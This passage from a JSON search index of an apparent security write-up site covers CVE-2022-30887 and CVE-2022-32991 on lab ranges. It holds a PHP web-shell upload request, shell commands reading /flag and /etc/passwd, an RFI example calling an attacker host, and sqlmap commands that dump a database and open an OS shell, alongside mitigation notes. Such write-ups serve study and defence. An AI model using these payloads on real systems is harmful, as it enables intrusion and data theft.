sterilized. Example of LFI (Local File Inclusion) ; <?php if($_REQUEST['s']) { system($_REQUEST['s']); } else phpinfo();?>","title":"LFI (Local File Inclusion)"},{"location":"cves/CVE-2022/CVE-2022-30887/#rfi-remote-file-inclusion","text":"This vulnerability works when the attacker upload malware from a remote server. Example of RFI (Remote File Inclusion) ; www.victim_site.com/abc.php?test=http://www.attacker_site.com/attack_page","title":"RFI (Remote File Inclusion)"},{"location":"cves/CVE-2022/CVE-2022-30887/#explanation-of-exploit","text":"\u8fd9\u91cc\u4f7f\u7528\u6625\u79cb\u4e91\u955c\u7684\u9776\u573a https://yunjing.ichunqiu.com/cve/detail/748 \u6253\u5f00\u7ad9\u70b9\u5e76\u7528 Burp Suite \u6355\u83b7\u8bf7\u6c42\uff0c\u5e76\u5c06\u8bf7\u6c42 Send to Repeater \u5728 Repeater \u4e2d\u5199\u5165\u5982\u4e0b PoC \uff08\u6ce8\u610f\u4fee\u6539Host\uff09\u53d1\u9001\u540e\u67e5\u770b Response \u6709 Sucess \u5b57\u6837\u5219\u4e3a\u4e0a\u6b21\u6210\u529f\uff0c \u6587\u4ef6\u88ab\u4e0a\u4f20\u5230 /assets/myimages/ \u76ee\u5f55\u4e0b \u4e0a\u4f20 shell.php \u540e\u5728\u6d4f\u89c8\u5668\u4e2d\u5373\u53ef\u6267\u884c\u4efb\u4f55\u547d\u4ee4\uff0c\u5982\u83b7\u53d6 flag \u4e3a http://eci-2ze1l9hzv0tz04yrt7rl.cloudeci1.ichunqiu.com/assets/myimages/shell.php?s=cat%20/flag \u6267\u884c\u5176\u4ed6\u547d\u4ee4\u5982 cat /etc/passwd","title":"Explanation of exploit"},{"location":"cves/CVE-2022/CVE-2022-30887/#poc","text":"POST /php_action/editProductImage.php?id=1 HTTP/1.1 Host: eci-2zegbcou4c05rxuhfujv.cloudeci1.ichunqiu.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------208935235035266125502673738631 Content-Length: 556 Connection: close Cookie: PHPSESSID=t1jo541l52f76t9upiu0pbqv0c Upgrade-Insecure-Requests: 1 -----------------------------208935235035266125502673738631 Content-Disposition: form-data; name=\"old_image\" -----------------------------208935235035266125502673738631 Content-Disposition: form-data; name=\"productImage\"; filename=\"shell.php\" Content-Type: image/jpeg <?php if($_REQUEST['s']) { system($_REQUEST['s']); } else phpinfo(); ?> </pre> </body> </html> -----------------------------208935235035266125502673738631 Content-Disposition: form-data; name=\"btn\" -----------------------------208935235035266125502673738631--","title":"PoC"},{"location":"cves/CVE-2022/CVE-2022-30887/#mitigation","text":"ensure you only accept characters such as a-Z0-9 and do not allow .. or / or %00 (null byte) Be ensure allow_url_include flag must be off acording to owasp 10 Remediation; \"Application can maintain a *white list of files, that may be included by the page, and then use an identifier (for example the index number) to access to the selected file. Any request containing an invalid identifier has to be rejected, in this way there is no attack surface for malicious users to manipulate the path\"","title":"Mitigation"},{"location":"cves/CVE-2022/CVE-2022-30887/#refer","text":"https://nvd.nist.gov/vuln/detail/CVE-2022-30887 https://github.com/MuallimNaci/CVE-2022-30887","title":"Refer"},{"location":"cves/CVE-2022/CVE-2022-32991/","text":"CVE-2022-32991 \u00b6 Description \u00b6 Web Based Quiz System v1.0 \u7684 welcome.php \u4e2d\u7684eid\u53c2\u6570\u88ab\u53d1\u73b0\u5305\u542b\u4e00\u4e2aSQL\u6ce8\u5165\u6f0f\u6d1e\u3002 Explanation of exploit; PoC \u00b6 \u6f0f\u6d1e\u6587\u4ef6welcome.php\u4f4d\u4e8e\u7f51\u7ad9\u6839\u76ee\u5f55\u3002\u7b2c93\u884c\u6ca1\u6709\u8fc7\u6ee4eid\u53c2\u6570\uff0c\u5728\u7b2c96\u884c\u76f4\u63a5\u5e26\u5165\u6570\u636e\u5e93\u67e5\u8be2\uff0c\u5bfc\u81f4SQL\u6ce8\u5165\u6f0f\u6d1e\uff1a \u5148\u6ce8\u518c\u4e00\u4e2a\u666e\u901a\u7528\u6237\u7136\u540e\u767b\u5f55\uff0c\u7136\u540e\u70b9\u51fb start \u6309\u94ae\uff0c\u7528 Burp Suite \u6293\u53d6\u6570\u636e\u5305\u5982\u4e0b\u56fe\uff1a \u5c06\u6570\u636e\u5305\u4fdd\u5b58\u4e3a eid.txt\uff0c\u4f7f\u7528sqlmap\u83b7\u53d6\u6570\u636e\u5e93\u4fe1\u606f\uff0csqlmap\u6ce8\u5165\u8bed\u53e5\u4e3a\uff1a sqlmap -r eid.txt --dbs ---batch --random-agent -p eid \uff0c\u5982\u4e0b\u56fe\uff1a \u83b7\u53d6\u6570\u636e\u5e93\u4fe1\u606f\u540e\uff0c\u4f7f\u7528sqlmap\u83b7\u53d6\u8868\u4fe1\u606f\uff0csqlmap\u6ce8\u5165\u8bed\u53e5\u4e3a\uff1a sqlmap -r eid.txt --dbs ---batch --random-agent -p eid -D ctf --tables \uff0c\u5982\u4e0b\u56fe\uff1a \u83b7\u53d6\u8868\u4fe1\u606f\u540e\uff0c\u4f7f\u7528sqlmap\u83b7\u53d6\u5217\u4fe1\u606f\uff0csqlmap\u6ce8\u5165\u8bed\u53e5\u4e3a\uff1a sqlmap -r eid.txt --dbs ---batch --random-agent -p eid -D ctf -T flag --columns \uff0c\u5982\u4e0b\u56fe\uff1a \u83b7\u53d6\u5217\u4fe1\u606f\u540e\uff0c\u4f7f\u7528sqlmap\u83b7\u53d6\u6570\u636e\uff0csqlmap\u6ce8\u5165\u8bed\u53e5\u4e3a\uff1a sqlmap -r eid.txt --dbs ---batch --random-agent -p eid -D ctf -T flag -C flag --dump \uff0c\u5982\u4e0b\u56fe\uff1a \u4e5f\u53ef\u4ee5\u83b7\u53d6 os-shell, sqlmap\u6ce8\u5165\u8bed\u53e5\u4e3a\uff1a sqlmap -r eid.txt --dbs ---batch --random-agent -p eid --os-shell \uff0c\u5982\u4e0b\u56fe\uff1a Mitigation \u00b6 \u5bf9\u8f93\u5165\u7684\u6570\u636e\u8fdb\u884c\u8fc7\u6ee4\uff0c\u9632\u6b62SQL\u6ce8\u5165\u6f0f\u6d1e\u3002 \u4f7f\u7528\u9884\u7f16\u8bd1\u8bed\u53e5\uff0c\u9632\u6b62SQL\u6ce8\u5165\u6f0f\u6d1e\u3002 Refer \u00b6 https://nvd.nist.gov/vuln/detail/CVE-2022-32991 https://www.yuque.com/docs/share/fd95cc4d-2a38-4e5a-9fac-bfa3534f8056","title":"CVE-2022-32991"},{"location":"cves/CVE-2022/CVE-2022-32991/#cve-2022-32991","text":"","title":"CVE-2022-32991"},{"location":"cves/CVE-2022/CVE-2022-32991/#description","text":"Web Based Quiz System v1.0 \u7684 welcome.php \u4e2d\u7684eid\u53c2\u6570\u88ab\u53d1\u73b0\u5305\u542b\u4e00\u4e2aSQL\u6ce8\u5165\u6f0f\u6d1e\u3002","title":"Description"},{"location":"cves/CVE-2022/CVE-2022-32991/#explanation-of-exploit-poc","text":"\u6f0f\u6d1e\u6587\u4ef6welcome.php\u4f4d\u4e8e\u7f51\u7ad9\u6839\u76ee\u5f55\u3002\u7b2c93\u884c\u6ca1\u6709\u8fc7\u6ee4eid\u53c2\u6570\uff0c\u5728\u7b2c96\u884c\u76f4\u63a5\u5e26\u5165\u6570\u636e\u5e93\u67e5\u8be2\uff0c\u5bfc\u81f4SQL\u6ce8\u5165\u6f0f\u6d1e\uff1a \u5148\u6ce8\u518c\u4e00\u4e2a\u666e\u901a\u7528\u6237\u7136\u540e\u767b\u5f55\uff0c\u7136\u540e\u70b9\u51fb start \u6309\u94ae\uff0c\u7528 Burp Suite \u6293\u53d6\u6570\u636e\u5305\u5982\u4e0b\u56fe\uff1a \u5c06\u6570\u636e\u5305\u4fdd\u5b58\u4e3a eid.txt\uff0c\u4f7f\u7528sqlmap\u83b7\u53d6\u6570\u636e\u5e93\u4fe1\u606f\uff0csqlmap\u6ce8\u5165\u8bed\u53e5\u4e3a\uff1a sqlmap -r eid.txt --dbs ---batch --random-agent -p eid \uff0c\u5982\u4e0b\u56fe\uff1a \u83b7\u53d6\u6570\u636e\u5e93\u4fe1\u606f\u540e\uff0c\u4f7f\u7528sqlmap\u83b7\u53d6\u8868\u4fe1\u606f\uff0csqlmap\u6ce8\u5165\u8bed\u53e5\u4e3a\uff1a sqlmap -r eid.txt --dbs ---batch --random-agent -p eid -D ctf --tables \uff0c\u5982\u4e0b\u56fe\uff1a \u83b7\u53d6\u8868\u4fe1\u606f\u540e\uff0c\u4f7f\u7528sqlmap\u83b7\u53d6\u5217\u4fe1\u606f\uff0csqlmap\u6ce8\u5165\u8bed\u53e5\u4e3a\uff1a sqlmap -r eid.txt --dbs ---batch --random-agent -p eid -D ctf -T flag --columns \uff0c\u5982\u4e0b\u56fe\uff1a \u83b7\u53d6\u5217\u4fe1\u606f\u540e\uff0c\u4f7f\u7528sqlmap\u83b7\u53d6\u6570\u636e\uff0csqlmap\u6ce8\u5165\u8bed\u53e5\u4e3a\uff1a sqlmap -r eid.txt --dbs ---batch --random-agent -p eid -D ctf -T flag -C flag --dump \uff0c\u5982\u4e0b\u56fe\uff1a \u4e5f\u53ef\u4ee5\u83b7\u53d6 os-shell, sqlmap\u6ce8\u5165\u8bed\u53e5\u4e3a\uff1a sqlmap -r eid.txt --dbs ---batch --random-agent -p eid --os-shell \uff0c\u5982\u4e0b\u56fe\uff1a","title":"Explanation of exploit; PoC"},{"location":"cves/CVE-2022/CVE-2022-32991/#mitigation","text":"\u5bf9\u8f93\u5165\u7684\u6570\u636e\u8fdb\u884c\u8fc7\u6ee4\uff0c\u9632\u6b62SQL\u6ce8\u5165\u6f0f\u6d1e\u3002 \u4f7f\u7528\u9884\u7f16\u8bd1\u8bed\u53e5\uff0c\u9632\u6b62SQL\u6ce8\u5165\u6f0f\u6d1e\u3002","title":"Mitigation"},{"location":"cves/CVE-2022/CVE-2022-32991/#refer","text":"https://nvd.nist.gov/vuln/detail/CVE-2022-32991 https://www.yuque.com/docs/share/fd95cc4d-2a38-4e5a-9fac-bfa3534f8056","title":"Refer"},{"location":"hackthebox/","text":"Introduction \u00b6 About Hackthebox introduction.","title":"Introduction"},{"location":"hackthebox/#introduction","text":"About Hackthebox introduction.","title":"Introduction"},{"location":"vulnhub/","text":"Introduction \u00b6 About vulnHub introduction.","title":"Introduction"},{"location":"vulnhub/#introduction","text":"About vulnHub introduction.","title":"Introduction"},{"location":"vulnhub/Jarbas-1/","text":"Jarbas: 1 \u00b6 Infomation \u00b6 Name: Jarbas: 1 Date release: 3 Apr 2018 Author: Tiago Tavares Series: Jarbas","title":"Jarbas: 1"},{"location":"vulnhub/Jarbas-1/#jarbas-1","text":"","title":"Jarbas: 1"},{"location":"vulnhub/Jarbas-1/#infomation","text":"Name: Jarbas: 1 Date release: 3 Apr 2018 Author: Tiago Tavares Series: Jarbas","title":"Infomation"}]}